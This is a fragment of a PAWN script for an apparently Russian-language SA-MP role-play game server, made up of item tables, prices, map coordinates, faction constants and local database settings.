	{1, 19049, 19049, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Часы",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //450
	{1, 19050, 19050, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Часы",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //451
	{1, 19051, 19051, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Часы",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //452
	{1, 19053, 19053, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Часы",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //453
 	{1, 3026, 3026, true, "_", "Портфель",{0.000000, 15.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, -90.0, 0.0, 0.0},true}, //454//портфели
	{1, 371, 371, true, "_", "Портфель",{0.000000, 12.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, -90.0, 0.0, 0.0},true}, //455
	{1, 19559, 19559, true, "_", "Портфель",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, -90.0, 0.0, 0.0},true}, //456
	{1, 18970, 18970, true, "_", "Шляпа",{-15.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 10.0, 0.0},true}, //457 ///шляпы
	{1, 18973, 18973, true, "_", "Шляпа",{-15.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 10.0, 0.0},true}, //458 // не дает
	{1, 18972, 18972, true, "_", "Шляпа",{-15.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 10.0, 0.0},true}, //459
	{1, 18971, 18971, true, "_", "Шляпа",{-15.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 10.0, 0.0},true}, //460
	{1, 18910, 18910, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Бандана",{90.000000, 90.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 120.0, 0.0},true}, //461 //банданы на голову
	{1, 18909, 18909, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Бандана",{90.000000, 90.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 120.0, 0.0},true}, //462
	{1, 18908, 18908, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Бандана",{90.000000, 90.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 120.0, 0.0},true}, //463
	{1, 18907, 18907, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Бандана",{90.000000, 90.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 120.0, 0.0},true}, //464
	{1, 18906, 18906, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Бандана",{90.000000, 90.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 120.0, 0.0},true}, //465
	{1, 19487, 19487, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Колпак",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //466 //колпаки
	{1, 19352, 19352, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Колпак",{0.000000, 25.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //467
	{1, 19351, 19351, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Усы",{0.000000, 90.000000, 90.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 90.0, 0.0},true}, //468//усы
	{1, 19350, 19350, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Усы",{0.000000, 90.000000, 90.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 90.0, 0.0},true}, //469
	{1, 19319, 19319, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Гитара",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, -90.0, 0.0, 0.0},true}, //470 //Гитары
	{1, 19318, 19318, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Гитара",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, -90.0, 0.0, 0.0},true}, //471
	{1, 19317, 19317, true, "Для управления аксессуарами используйте: {f7ae11}/acs", "Гитара",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, -90.0, 0.0, 0.0},true}, //472*/
	{1, 1581, 1581, true, "Для использования введите: {f7ae11}/pass", "Паспорт",{0.000000, 180.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, -90.0, 0.0, 0.0},true},
	{1, 333, 333, true, "Golf club", "Клюшка",{0.000000, -30.000000, 0.000000, 1.500000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true},
	{1, 334, 334, true, "Nite stick", "Дубинка",{0.000000, -30.000000, 0.000000, 1.500000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true},
	{500, 347, 347, true, "Silenced pistol", "Silenced pistol",{0.000000, -30.000000, 0.000000, 1.500000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true},
	{1, 19918, 19918, true, "Для использования введите: {f7ae11}/opencase", "Кейс",{0.000000, 0.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true},
	{1, 19308, 19308, true, "Для использования введите: {f7ae11}/taxi", "Шашка 'Taxi'",{0.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true},
	{500, 19832, 19832, true, "Для создания оружия используйте: {f7ae11}/sellgun", "Материалы",{0.000000, 0.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true},
	{1, 18642, 18642, true, "Shocker", "Электрошокер",{180.000000, 0.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true},
	{6, 2684, 2684, true, "Для использования введите: {f7ae11}/lic", "Лицензии",{0.000000, 0.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 90.0, 0.0, 0.0},true},
	{200, 1509, 1509, true, "", "Вино",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //пиво 316
	{200, 1520, 1520, true, "", "Виски",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //пиво 316
	{200, 1512, 1512, true, "", "Абсент",{0.000000, 0.000000, 0.000000, 1.00000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}, //пиво 316
	{200, 2703, 2703, true, "", "Бургер",{90.000000, 0.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true},
	{200, 2702, 2702, true, "", "Кусок пиццы",{0.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true},
	{12, 2358, 2358, true, "", "Ящик с материалами",{0.000000, 0.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true},
	{10, 2358, 2358, true, "", "Аптечка",{0.000000, 0.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true},
	{6, 1575, 1575, true, "", "Наркотики",{0.000000, 0.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true},
	{100, 11716, 11716, true, "Для использования введите: {f7ae11}/hack", "Отымчка",{0.000000, 0.000000, 90.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true},
	{1000000, 1550, 1550, true, "", "Сумка с деньгами",{0.000000, 0.000000, 0.000000, 1.000000},{0.0, 0.0, -0.91, 0.0, 0.0, 0.0},true}
};
#define P_SHAHTA 0
#define P_OIL 1
#define P_DEREVO 2

new PriceLS[3] = {200,300,400};
new PriceLV[3] = {200,300,400};
new TrailerKol[MAX_PLAYERS];

// 2 7 10
new Text3D:portlstext;
new Text3D:portlvtext;
#define MAX_RADARS 100
enum rInfo{
    rid,
    rName[32],
Float:rX,
Float:rY,
Float:rZ,
Float:rRZ,
Float:rR,
    rSpeed,
    rObj,
    Text3D:rLabel,
    Float:rCamx,
	Float:rCamy,
	Float:rCamz,
	Float:rCamxx,
	Float:rCamyy,
	Float:rCamzz
};
new bool:kanals;



new RadarInfo[MAX_RADARS][rInfo];
enum tginf
{
	tID,
    tPrice,
    tSlot,
    tKol,
    tIDacc
};
new TorgInfo[tginf][72];
new Text:Roulette[25];
new PlayerText:RouletteP[3][MAX_PLAYERS];
new TOTALRADAR;
new radar_time[MAX_PLAYERS];
new ItemsId[14][20] =
{
	{ 19421,19422,19423,19424,1}, //Наушники
	{ 19069,19068,19067,19554,18953,18954,1},//Шапки
	{ 18968,18967,18969,1},//Панамки
	{ 18955,18956,18957,18959,18926,18927,18928,18929,18930,18931,18932,18933,1},//Кепки
	{ 19104,19105,19106,19107,19108,19109,1},//Каски
	{ 18925,18922,18923,18924,18921,1},//Береты
	{ 19519,19274,1},//Парики
	{ 19011,19012,19013,19014,19015,19016,19017,19018,19019,19024,19027,19028,19029,19022,19035,19031,19032,19033,1},//Очки
	{ 18911,18912,18913,18914,18915,18916,18917,18918,18919,18920,1 }, //Банданы
	{ 18947,18948,18949,18950,18951,1 }, //Шляпы
	{ 19042,19041,19040,19039,19043,19044,19045,19046,19048,19049,19050,19051,19053,1 }, //Часы
	{ 3026,371,19559,1 },//портфели
	{ 18970, 18973, 18972, 18971,1 },//Шляпы
	{ 18910, 18909, 18908, 18907, 18906,1 }// Банданы на голову
};
new bool:optx2;
new numberpic[2];
new armzone;
static const Float:randomstol[9][4] = {
{2865.2991,-1201.2545,1027.8796,181.6803}, // 1
{2862.8591,-1201.2555,1027.8748,183.2470}, // 2
{2860.4048,-1201.2554,1027.8796,187.9470}, // 3
{2857.8462,-1201.2549,1027.8796,185.1270}, // 4
{2860.4136,-1203.3555,1027.8796,179.1736}, // 5
{2862.9021,-1203.3551,1027.8748,177.6069}, // 6
{2865.3491,-1203.3549,1027.8796,182.6203}, // 7
{2859.3784,-1208.1433,1028.0563,96.7661}, // 8
{2859.3916,-1210.7091,1028.0563,95.8261} // 9
};
#define MAX_BILLBORDS 51
new Text:Inventory[39];
new Text:Inventory1[16];
new PlayerText:ActionInventoryP[6][MAX_PLAYERS];
new PlayerText:InvAmm[MAX_PLAYERS][36];
new PlayerText:InvAmm1[MAX_PLAYERS][36];
new PlayerText:InventoryP[47][MAX_PLAYERS];

new PlayerText:InventoryP1[36][MAX_PLAYERS];
new Colors_LOW[][12] = { "000000","FFFFFF","20B2AA","DC143C","6495ED","f0e68c","778899","FF1493","F4A460","EE82EE","FFD720", "8b4513","4949A0","148b8b","14ff7f","556b2f","0FD9FA","10DC29","534081","0495CD","EF6CE8","BD34DA",
"247C1B","0C8E5D","635B03","CB7ED3","65ADEB","5C1ACC","F2F853","11F891","7B39AA","53EB10","54137D", "275222","F09F5B","3D0A4F","22F767","D63034","9A6980","DFB935","3793FA","90239D","E9AB2F","AF2FF3",
"057F94","B98519","388EEA","028151","A55043","0DE018","93AB1C","95BAF0","369976","18F71F","4B8987", "491B9E","829DC7","BCE635","CEA6DF","20D4AD","2D74FD","3C1C0D","12D6D4","48C000","2A51E2","E3AC12",
"FC42A8","2FC827","1A30BF","B740C2","42ACF5","2FD9DE","FAFB71","05D1CD","C471BD","94436E","C1F7EC", "CE79EE","BD1EF2","93B7E4","3214AA","184D3B","AE4B99","7E49D7","4C436E","FA24CC","CE76BE","A04E0A",
"9F945C","DCDE3D","10C9C5","70524D","0BE472","8A2CD7","6152C2","CF72A9","E59338","EEDC2D","D8C762","3FE65C" };
new Colors_BIG[100] = { 0x000000,0xFFFFFF,0x20B2AA,0xDC143C,0x6495ED,0xf0e68c,0x778899,0xFF1493,0xF4A460,0xEE82EE,0xFFD720, 0x8b4513,0x4949A0,0x148b8b,0x14ff7f,0x556b2f,0x0FD9FA,0x10DC29,0x534081,0x0495CD,0xEF6CE8,0xBD34DA,
0x247C1B,0x0C8E5D,0x635B03,0xCB7ED3,0x65ADEB,0x5C1ACC,0xF2F853,0x11F891,0x7B39AA,0x53EB10,0x54137D, 0x275222,0xF09F5B,0x3D0A4F,0x22F767,0xD63034,0x9A6980,0xDFB935,0x3793FA,0x90239D,0xE9AB2F,0xAF2FF3,
0x057F94,0xB98519,0x388EEA,0x028151,0xA55043,0x0DE018,0x93AB1C,0x95BAF0,0x369976,0x18F71F,0x4B8987, 0x491B9E,0x829DC7,0xBCE635,0xCEA6DF,0x20D4AD,0x2D74FD,0x3C1C0D,0x12D6D4,0x48C000,0x2A51E2,0xE3AC12,
0xFC42A8,0x2FC827,0x1A30BF,0xB740C2,0x42ACF5,0x2FD9DE,0xFAFB71,0x05D1CD,0xC471BD,0x94436E,0xC1F7EC, 0xCE79EE,0xBD1EF2,0x93B7E4,0x3214AA,0x184D3B,0xAE4B99,0x7E49D7,0x4C436E,0xFA24CC,0xCE76BE,0xA04E0A,
0x9F945C,0xDCDE3D,0x10C9C5,0x70524D,0x0BE472,0x8A2CD7,0x6152C2,0xCF72A9,0xE59338,0xEEDC2D,0xD8C762, 0x3FE65C };

enum B_INFO
{
    bObjectID,
	Float:bPos[4],
    bPosText[32],
	bText[144],
	bOwner[MAX_PLAYER_NAME],
	bBackColor,
	bFontFace,
	bAligment,
	bFontSize,
	bDay
};
new BildInfo[MAX_BILLBORDS][B_INFO];
new TOTALBIL;
enum Anim
{
	aName[24],
	aNameWalk[16],
};
new Anims[14][Anim] = {
	{"Стандартный", "0"},
	{"Нормальный", "WALK_player"},
	{"Гражданский", "WALK_civi"},
	{"Гангстерский (1)", "WALK_gang1"},
	{"Гангстерский (2)", "WALK_gang2"},
	{"Старик (1)", "WALK_old"},
	{"Старик (2)", "WALK_fatold"},
	{"Толстяк", "WALK_fat"},
	{"Девушка (1)", "WOMAN_walknorm"},
	{"Девушка (2)", "WOMAN_walkbusy"},
	{"Проститутка (1)", "WOMAN_walkpro"},
	{"Проститутка (2)", "WOMAN_walksexy"},
	{"Пьяный", "WALK_drunk"},
	{"Слепой", "Walk_Wuzi"}
};
new ItemsCost[14][20] =
{
    { 30,30,35,40,1}, //Наушники
    { 20,20,35,50,25,25,1},//Шапки
    { 10,10,10,1},//Панамки
    { 8,8,8,15,15,10,30,30,20,20,20,30,1},//Кепки
    { 20,20,25,25,25,25,1},//Каски
    { 12,18,18,20,25,1},//Береты
    { 22,22,1},//Парики
    { 5,10,5,8,12,15,22,22,22,25,25,25,25,25,18,18,18,30,1},//Очки
    { 15,8,8,12,12,12,10,10,10,15,1 }, //Банданы
    { 20,20,20,20,20,1 }, //Шляпы
    { 150,200,300,350,400,40,40,40,47,52,40,45,50,1 }, //Часы
    {10,8,12,1},//портфели
    {28,28,32,30,1},//шляпы
    {15,15,15,15,15,1}//Банданы
};



#define NAME_SERVER "Maryland Role Play | ЗБТ"

#define SQL_HOST    		"127.0.0.1"// host
#define SQL_USER    		"root"// пользователь
#define SQL_PASS    		""// пароль
#define SQL_DB      		"MaryRP"// база данных

//#endif

native IsValidVehicle(vehicleid);

#define G_STATE_NOT_GAMBLING    0
#define G_STATE_READY           1
#define G_STATE_GAMBLING        2
#define G_STATE_DISPLAY         3
#define G_STATE_PLAY_AGAIN      4


// BD host
#define TABLE_ACCOUNT       "accounts"
#define TABLE_FRACTION      "fraction"
#define function%0(%1) 		forward%0(%1); public%0(%1)
#define COLOR_GREY 			0x226171AA
#define COLOR_PURPLE 		0xBD96FDFF
#define COLOR_ORANGE   0xFFA938FF
/*#define CREWARD 0xf7ae11FF*/
#define CREWARD 0xf7ae11FF

#define KEY_AIM (128)

#if defined MAX_PLAYERS
#undef MAX_PLAYERS
#define MAX_PLAYERS 40
#endif


#define FD1 strcmp(PlayerInfo[playerid][pSendername], "Enique_Guddi", true) == 0
#define FD2 strcmp(PlayerInfo[playerid][pSendername], "Leon_Versace", true) == 0
#define COLOR_LIGHTRED 		0xFF6347AA
#define COLOR_SKLAD  		0x03C03CAA
#define TABLE_VEH           "vehicle"
#define CAGREEN             0x20BA09FF
#define F_MAYOR 			1
#define F_LVPD 				2
#define F_FBI 				3
#define F_HOSPITAL_LS 		4
#define F_LIC 				5

#define F_GROVE         	6
#define F_BALLAS        	7
#define F_RIFA 				8
#define F_AZTECAS       	9
#define F_VAGOS         	10
#define F_BIKERS          	11
#define F_LCN 				12
#define F_YAKUZA   			13
#define F_RM    			14
#define F_NEWS 				15
#define F_ARMY         	    16
#define F_LSPD				17



#define	GUN__IGNORE_TIME 	1500
#define	TP__IGNORE_TIME		1500
#define TABLE_GANGZONE      "loadgz"
#define _getCoordsForFuelBar(%0) \
	-0.588237 + (((-7.129415 + -0.588237) / 100) * %0)  + 1.2

new bool:StatusKoyka[20] = false;
new Text3D:KoykaText[20];
static Float:Koyka[20][4] = {
{1405.8975,-27.1473,1001.5430,95.8475}, // 1
{1406.0374,-24.5499,1001.5430,86.4240}, // 2
{1406.0051,-21.8443,1001.5430,95.8241}, // 3
{1405.9456,-19.5042,1001.5430,88.3041}, // 4
{1405.8046,-17.0206,1001.5430,103.9708}, // 5
{1405.9828,-14.4958,1001.5430,89.2440}, // 6
{1400.9673,-14.3526,1001.5430,273.4624}, // 7
{1401.0339,-17.1958,1001.5430,269.0757}, // 8
{1393.4656,-27.2071,1001.5430,272.4990}, // 9
{1393.2921,-24.6322,1001.5430,271.8723}, // 10
{1393.5469,-21.9982,1001.5430,255.2655}, // 11
{1393.3995,-19.6131,1001.5430,270.3056}, // 12
{1393.5114,-17.0358,1001.5430,267.1722}, // 13
{1393.5309,-14.4963,1001.5430,270.6190}, // 14
{1398.2512,-14.3722,1001.5430,73.8437}, // 15
{1398.2114,-17.0466,1001.5430,90.4505}, // 16

{1413.0947,-26.8248,1001.4503,83.0241}, // 17
{1413.1509,-21.9961,1001.4503,6.2567}, // 18
{1421.4703,-26.9428,1001.4503,281.0292}, // 19
{1421.8029,-21.8284,1001.4503,336.8030} // 20
};
new KoykaCena;




enum GzLinfo
{
	gID,
	gOwner[2],
	Float:gFinish,
	Float:gCoords[5],
};
new GZLogoInfo[40][GzLinfo];
new TOTALGF;
new TotalGraf[5];
enum antiden
{
	Float:admX,
	Float:admY,
	Float:admZ,
	admRad,
	admV,
	admI,
	admSP,
	admName[32]
}
new AntiDM[100][antiden];
new Perevod,Birga,Advocat;
new bolka;

new picpost[5],sppost[5];
//cuf
#if !defined gc_SUSPECT_UPDATE_INTERVAL
	#define gc_SUSPECT_UPDATE_INTERVAL 1000
#endif

#if !defined gc_CUFF_DISTANCE
	#define gc_CUFF_DISTANCE 3.0
#endif

#if !defined gc_UNCUFF_DISTANCE
	#define gc_UNCUFF_DISTANCE 3.0
#endif

#if !defined gc_FOLLOW_DISTANCE
	#define gc_FOLLOW_DISTANCE 5.0
#endif

#if !defined gc_SUSPECT_RANGE_RUN
	#define gc_SUSPECT_RANGE_RUN 4.0
#endif

#if !defined gc_SUSPECT_RANGE_TP
	#define gc_SUSPECT_RANGE_TP 20.0
#endif

///
enum gIn
{
	gpsID,
	gpsList,
	gpsName[40],
	Float:gpsX,
	Float:gpsY,
	Float:gpsZ
}
new GPSInfo[200][gIn];
new TOTALGPS;
new DiploInfo[9][9];
//new towngz[2];
static Float:GzForDrugs[5][4] = {
 { -838.5692749023438, 2276.0069122314453, -636.5692749023438, 2470.0069122314453},
 { -1400.8992004394531, 2457.9027557373047, -1202.8992004394531, 2625.9027557373047},
 { -468.88873291015625, 1454.00341796875, -163.88873291015625, 1680.00341796875 },
 {  1676.6668090820312, 2699.003448486328, 1940.6668090820312, 2910.003448486328 },
 {  -21.57623291015625, 2348.798599243164, 417.42376708984375, 2576.798599243164 }
};
static Float:JobBotPos[9][4] = {
{2461.1699,1324.7358,10.8203,279.5580}, // устроиться развозчик
{2262.6577,2040.7985,10.8203,97.6548}, // устроиться bus
{1879.1948,2290.6282,10.9799,266.2062}, // устроиться механики
{1635.4651,1038.5602,10.8203,269.6530}, // устроиться такси
{2444.3225,-2119.7383,13.5469,1.4726}, // устроиться развозчик
{1109.3442,-1747.1495,13.5703,348.6024}, // устроиться bus
{1729.4286,-1062.7014,23.9410,3.3760}, // устроиться механики
{1626.2849,-1136.6710,23.9063,3.3526}, // устроиться такси
{-2456.1062,2250.0071,4.9222,110.2469} // устроиться дальнобойщиком
};


static Float:AshBotPos[7][4] = {
{1416.2103,6.3556,1005.4255,271.3906},// bot plane
{1414.9253,6.3392,1005.4255,91.5355},// bot boat
{1394.5483,-10.4821,1000.9153,179.8965},// bot weapon
{1403.1636,-7.6291,1005.4154,280.2110},// bot bike
{1416.7981,-17.2061,1005.4154,271.2692},// bot bus bot
{1408.2363,-25.4831,1005.4154,175.8467},// bot cargo bot
{1408.3192,-18.6195,1000.9153,358.6434}// bot passcanger
};
static Float:Computer[][3] = {
{1408.1559,-8.6428,1000.9153},
{1404.5870,-6.5927,1000.9153},
{1408.1077,-6.5892,1000.9153},
{1411.7703,-6.5890,1000.9153},
{1412.9260,-16.1627,1000.9153},
{1412.9250,-18.9050,1000.9153},
{1403.8547,-16.0710,1000.9153},
{1403.8538,-18.8212,1000.9153},
{1404.5989,-27.7957,1005.4154},
{1411.8976,-27.7967,1005.4154},
{1411.7937,-31.4360,1005.4154},
{1408.0947,-31.4370,1005.4154},
{1404.7828,-31.4381,1005.4154},
{1411.6639,-6.5920,1005.4154},
{1408.1646,-6.5888,1005.4154},
{1416.3313,-11.1500,1005.4154},
{1419.9247,-11.1549,1005.4154},
{1419.7738,-15.0521,1005.4154},
{1419.9474,-17.2452,1005.4154},
{1420.0787,-19.4500,1005.4154},
{1419.7926,-22.8777,1005.4154},
{1416.2523,-22.8750,1005.4154}
};
new WashBot;
new Text3D:WashText;

new JobBot[9];
new Text3D:JobBotText[9];

new shahtapic,oilpic,derevopic,portlv,portls;
new fbicar,fbiinvite,fbipros;
new Trailer[MAX_PLAYERS] = -1;

static Float:Vehicl[5][4] = {
{-314.4817,1515.0234,75.1010,0.0373},
{-319.0924,1515.1438,75.1024,0.4976},
{-325.0919,1514.7855,75.1033,358.4949},
{-331.5589,1514.7108,75.1037,359.9547},
{-337.9976,1514.2399,75.1034,358.3180}
};
new FBICars[5],bool:FBIStatus[5];
static IDVehicl[8] = {415,420,445,477,482,550,560,602};
/*




*/
new GzForDrugs1[sizeof(GzForDrugs)];
new phonepospic[133];
new Float:phonepos[133][3]=
{
	{1540.81, -1720.28, 13.79},
	{1163.00, -1704.39, 14.27},
	{1212.94, -1307.07, 13.78},
	{1363.9105,-1257.7277,13.5469},
	{1517.54, -1314.19, 15.23},
	{926.32, -1313.96, 13.81},
	{1066.10, -1029.03, 32.35},
	{460.74, -1607.63, 25.92},
	{333.68, -1775.89, 5.34},
	{539.27, -1266.13, 16.83},
	{1190.87, -930.76, 43.22},
	{1558.57, -1056.97, 24.02},
	{1674.82, -1168.34, 24.19},
	{1838.52, -1374.49, 13.86},
	{1795.61, -1620.13, 13.83},
	{1345.00, -1567.78, 13.89},
	{1947.05, -1794.71, 13.85},
	{2093.51, -1790.08, 13.79},
	{1950.80, -1978.01, 13.84},
	{1466.70, -2228.48, 13.80},
	{2088.65, -2101.52, 13.84},
	{2245.30, -2199.81, 13.87},
	{2205.43, -1994.22, 13.80},
	{2170.02, -1745.22, 13.82},
	{2243.34, -1724.31, 13.82},
	{2178.41, -1629.57, 15.08},
	{2422.05, -1890.09, 13.83},
	{2503.14, -1940.56, 13.81},
	{2730.45, -1987.05, 13.84},
	{2833.71, -1645.51, 11.21},
	{2484.72, -1495.39, 24.22},
	{2307.92, -1492.46, 23.81},
	{2277.04, -1338.40, 24.26},
	{2026.62, -1267.34, 24.30},
	{2195.91, -1132.80, 25.77},
	{1876.21, -1039.23, 24.08},
	{1990.07, -1472.45, 13.83},
	{2651.60, -1415.61, 30.63},
	{2831.02, -1129.65, 25.22},
	{2251.45, -1308.21, 24.28},
	{1750.36, -1453.00, 13.81},
	{1706.17, -1319.16, 13.84},
	{1429.55, -1536.88, 13.85},
	{1290.85, -1558.72, 13.87},
	{1827.07, 824.71, 10.75},
	{2026.67, 1080.83, 11.05},
	{2085.41, 1386.88, 11.08},
	{2091.63, 1713.69, 11.08},
	{2214.46, 1780.42, 11.13},
	{2101.19, 2031.25, 11.09},
	{2271.61, 2028.42, 11.06},
	{2118.22, 2234.50, 11.07},
	{2333.44, 2421.31, 11.11},
	{2436.25, 2353.93, 11.08},
	{2174.13, 2461.80, 11.09},
	{2019.56, 2460.77, 11.11},
	{1918.68, 2310.74, 11.08},
	{1720.38, 2242.66, 11.06},
	{1486.36, 2046.84, 11.09},
	{1641.04, 1848.49, 11.09},
	{1313.80, 2059.51, 11.06},
	{1119.09, 2059.85, 11.09},
	{1060.15, 1945.67, 11.08},
	{1050.40, 1381.40, 11.10},
	{1405.17, 1199.50, 11.11},
	{1574.73, 736.68, 11.15},
	{1636.78, 939.82, 11.08},
	{1689.39, 1266.98, 11.15},
	{1715.12, 1374.58, 10.93},
	{2443.80, 2061.84, 11.09},
	{2514.01, 1910.17, 11.13},
	{2616.46, 1973.91, 11.08},
	{2811.74, 2119.81, 10.97},
	{2884.44, 2301.22, 11.09},
	{2635.13, 2307.56, 11.09},
	{2520.01, 2302.06, 11.02},
	{2333.71, 1644.22, 11.10},
	{2434.64, 1506.88, 11.12},
	{2445.94, 1366.45, 11.10},
	{2591.83, 1185.00, 11.08},
	{2798.67, 1322.22, 11.20},
	{2560.91, 1367.11, 11.13},
	{2208.06, 1366.71, 11.08},
	{1853.97, 2061.76, 11.14},
	{1936.07, 2165.18, 11.13},
	{1934.44, 2048.72, 11.06},
	{-1807.46, -128.81, 5.97},
	{-2019.60, -61.78, 35.64},
	{-1996.47, 132.13, 27.94},
	{-2114.38, 327.02, 35.45},
	{-2258.88, 135.45, 35.62},
	{-2268.38, -174.33, 35.57},
	{-2363.64, -146.05, 35.61},
	{-2180.08, 313.92, 35.53},
	{-2018.43, 471.62, 35.47},
	{-2266.92, -36.03, 35.58},
	{-2427.97, -52.55, 35.58},
	{-2410.60, 310.71, 35.44},
	{-2237.71, 552.46, 35.44},
	{-2077.99, 557.22, 35.58},
	{-1824.78, 615.24, 35.48},
	{-1928.06, 720.37, 45.65},
	{-1986.18, 831.29, 45.68},
	{-1752.72, 829.49, 25.22},
	{-1723.04, 655.50, 25.18},
	{-1705.30, 825.06, 25.09},
	{-1805.25, 893.59, 25.08},
	{-1910.16, 867.79, 35.36},
	{-1993.13, 893.16, 45.72},
	{-2154.95, 763.83, 69.90},
	{-1982.00, 1088.07, 56.05},
	{-2643.99, 576.62, 14.94},
	{-2446.00, 716.49, 35.43},
	{-2246.69, 674.83, 49.70},
	{-2133.04, 896.79, 80.27},
	{-1631.27, 740.87, 14.90},
	{-1570.14, 508.45, 7.49},
	{-1673.62, 391.68, 7.44},
	{-1813.99, 71.72, 15.33},
	{-2245.78, -150.15, 35.57},
	{-2427.68, -135.93, 35.56},
	{-2508.02, -116.00, 25.91},
	{-2507.95, 17.15, 26.10},
	{-2363.44, -2.61, 35.51},
	{-2672.04, -63.73, 4.56},
	{-2664.74, -218.79, 4.61},
	{-2692.48, 280.11, 4.64},
	{-2732.06, 421.79, 4.60},
	{-1999.5015,96.6074,27.6875},
	{1721.2460,-1720.8604,13.5433},
	{1381.9146,-1802.9962,13.5469},
	{1394.5167,-1765.7505,13.5469},
	{547.3615,-1499.2080,14.5036}
};
new NumberDrugs;
new doorpd[16];
new doorsp[16];
new doorpd1[16];
static ac__carshot_check[MAX_PLAYERS];
native SendClientCheck(playerid, actionid, memaddr, memOffset, bytesCount);
#define PRESSED(%0) (((newkeys & (%0)) == (%0)) && ((oldkeys & (%0)) != (%0)))
#define RELEASED(%0) (((newkeys & (%0)) != (%0)) && ((oldkeys & (%0)) == (%0)))
#define MAX_BIZ 100
new Text:ObjectBuy[18];
new PlayerText:ObjectBuyP[3][MAX_PLAYERS];
new shot__player[MAX_PLAYERS];
new PlayerText:PointsTD[MAX_PLAYERS][2];
new Text:KrugL;
new SelectedImage[4][15] =
{
    "LD_BEAT:up",
    "LD_BEAT:down",
    "LD_BEAT:left",
    "LD_BEAT:right"
};

// догонялки
new DogGame;
new DogVed = INVALID_PLAYER_ID;
new DogVedPred = INVALID_PLAYER_ID;


new Text3D:DogText;
new DogMap;
new Text3D:ProdText;
new Float:Map1[3][5] = {
{-2646.3733,1411.1870,906.2734,95.6937,3.0},// jizzy
{-2660.9514,1420.6865,906.2734,90.0537,3.0},// jizzy
{-2668.8113,1428.1810,912.4063,263.9319,3.0}// jizzy
};
new Float:Map2[3][5] = {
{-972.9105,1075.1488,1344.9995,335.3002,10.0},// ggkarta
{-1056.4915,1083.9991,1342.8857,112.3006,10.0},// ggkarta
{-1131.8967,1046.0493,1345.7441,199.0948,10.0}// ggkarta
};
new Float:Map3[3][5] = {
{245.4117,113.4850,1003.2188,273.6454,10.0},// sfpd
{277.3381,117.9489,1004.6172,0.4396,10.0},// sfpd
{225.4141,121.1844,999.0726,334.4561,10.0}// sfpd
};
new Float:Map4[3][5] = {
{1263.9147,-784.0326,1091.9063,308.762,5.0},// osobnyak
{1283.2677,-836.0884,1089.9375,23.5540,5.0},// osobnyak
{1226.2474,-808.3510,1084.0078,223.8018,5.0}// osobnyak
};
new DogTime;
enum znbtl
{
	btimebattle,
	bplayer1,
	bplayer2,
	bstavka
};
new ZoneBattle[10][znbtl];
new BattleSp;
new PlayerImageID[MAX_PLAYERS][3];
